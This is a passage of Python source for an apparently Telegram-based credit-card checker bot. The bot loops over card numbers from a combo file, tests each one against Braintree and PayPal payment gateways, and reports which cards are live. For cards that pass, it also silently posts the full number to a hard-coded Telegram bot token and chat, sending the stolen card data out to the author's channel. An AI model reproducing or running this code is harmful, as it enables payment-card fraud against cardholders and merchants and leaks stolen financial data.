					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @@Moha_Azouz''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
					msgc=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(2)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	#بدايه برانتري اوث
@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Tele(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @@Moha_Azouz''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
					msgc=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(2)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	# نهايه برانتري اوث
@bot.callback_query_handler(func=lambda call: call.data == 'payp')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='𝐏𝐚𝐲𝐩𝐚𝐥 $𝟏'
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(pay(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @@Moha_Azouz''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
					msgc=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'risk' in last:
						risk+=1
						bot.send_message(call.from_user.id, risk)
					elif 'CVV' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz 
</b>"""
						tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
						tlg_params = {"parse_mode": "HTML"}

						i = requests.post(tlg, params=tlg_params)
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(2)
		except Exception as e:
			print(e)
		stopuser[f'{id}']['status'] = 'start'
		bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text='𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'br2')
def menu_callback(call):
	def my_function():
		id=call.from_user.id
		gate='Braintree Auth 2 '
		dd = 0
		live = 0
		riskk = 0
		ccnn = 0
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= "𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
		try:
			with open("combo.txt", 'r') as file:
				lino = file.readlines()
				total = len(lino)
				try:
					stopuser[f'{id}']['status'] = 'start'
				except:
					stopuser[f'{id}'] = {
				'status': 'start'
			}
				for cc in lino:
					if stopuser[f'{id}']['status'] == 'stop':
						bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗬 ➜ @Moha_Azouz')
						return
					try:
						data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
						
						
					except:
						pass
					try:
						level=(data['level'])
					except:
												level=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						bank=(data['bank']['name'])
					except:
						bank=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country_flag=(data['country']['emoji'])
					except:
						country_flag=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						country=(data['country']['name'])
					except:
						country=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						brand=(data['scheme'])
					except:
						brand=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						card_type=(data['type'])
					except:
						card_type=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					try:
						url=(data['bank']['url'])
					except:
						url=('𝒖𝒏𝒌𝒏𝒐𝒘𝒏')
					
					start_time = time.time()
					try:
						last = str(Tele2(cc))
					except Exception as e:
						print(e)
						last = "ERROR"
					if 'risk' in last:
						last='declined'
					elif 'Duplicate' in last:
						last='Approved'
					mes = types.InlineKeyboardMarkup(row_width=1)
					cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
					status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
					cm3 = types.InlineKeyboardButton(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {live} ] •", callback_data='x')
					ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 ☑️ ➜ [ {ccnn} ] •", callback_data='x')
					cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
					risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🏴‍☠️ ➜ [ {riskk} ] •", callback_data='x')
					cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {total} ] •", callback_data='x')
					stop=types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
					mes.add(cm1,status, cm3,ccn,risk, cm4, cm5, stop)
					end_time = time.time()
					execution_time = end_time - start_time
					bot.edit_message_text(chat_id=call.message.chat.id, 
					  message_id=call.message.message_id, 
					  text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
𝘽𝙤𝙩 𝘽𝙮 @@Moha_Azouz''', reply_markup=mes)
					
					msg=f'''<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ✅
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''
					msgc=f'''<b>𝘾𝘾𝙉 ☑️
			
𝘾𝙖𝙧𝙙 ➼ <code>{cc}</code>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 ➼ {last}
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➼ {gate}		
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➼ <code>{country} - {country_flag}</code> 
𝘽𝙞𝙣 ➼ <code>{cc[:6]} - {card_type} - {brand}</code>
𝙄𝙨𝙨𝙪𝙚𝙧 ➼ <code>{bank}</code>
𝙏𝙞𝙢𝙚 ➼ {"{:.1f}".format(execution_time)}
𝗕𝗼𝘁 𝗕𝘆: @Moha_Azouz</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						tok = '7256336819:AAGOA4MBllwqF0XrP44Nfl1lS8xQK9Vb8GY'
						acc =  '-1002111411217'
						mg = f"""<b> 
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
｢𝙲𝙲」➔ <code>{cc}</code>
❆═══» 𝙸𝙽𝙵𝙾 «═══❆
｢𝙱𝙸𝙽」➔ <code>{cc[:6]}</code>
｢𝙸𝙽𝙵𝙾」➔ <code>{brand} - {card_type} - {level}</code>
｢𝙱𝙰𝙽𝙺」➔ <code>{bank}</code>
｢𝙲𝙾𝚄𝙽𝚃𝚁𝚈」➔ {country} - {country_flag}
❆═══» 𝙹𝙾𝙽𝚈 𝚂𝙲𝚁𝙰𝙿𝙿𝙴𝚁 «═══❆
✪ 𝙼𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ➔ @JI_NS
✪ 𝙼𝙰𝙳𝙴 𝚆𝙸𝚃𝙷 𝙱𝚈 ➔ @Moha_Azouz  
</b>"""
